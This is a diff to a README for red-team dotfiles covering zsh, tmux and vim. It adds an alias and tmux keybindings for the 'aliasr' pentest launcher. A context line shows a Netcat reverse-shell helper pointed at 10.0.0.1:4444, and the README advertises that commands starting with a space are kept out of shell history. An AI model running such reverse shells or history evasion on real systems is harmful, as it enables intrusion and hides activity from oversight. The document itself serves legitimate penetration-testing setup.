@@ -10,6 +10,7 @@ Clean and focused dotfiles for **zsh**, **tmux**, and **vim** tailored for red t
 - 🎯 **Warp Terminal Optimized**: Enhanced for modern terminal experience
 - 🌐 **Network Tools**: IPv4/IPv6 IP detection with service redundancy
 - 🛡️ **OPSEC Aware**: Commands starting with space aren't logged
+- 🧰 **aliasr Integration**: `a` alias in zsh and tmux keybindings for the aliasr pentest launcher
 - ⚡ **Fast & Clean**: Minimal overhead, maximum functionality
 - 🔧 **Cross-Platform**: Works on macOS, Linux, and WSL2
 
@@ -90,6 +91,12 @@ rev-shell nc 10.0.0.1 4444      # Netcat reverse shell
 tmux                       # Start tmux session
 # Prefix + P              # Start/stop recording
 # Prefix + S              # Save pane history
+# Prefix + U / K          # Open aliasr in split pane (send-only / send+execute)
+```
+
+### aliasr Launcher
+```bash
+a                          # Open aliasr TUI for red-team commands (requires aliasr installed)
 ```
 
 ## 🔒 OPSEC Notes
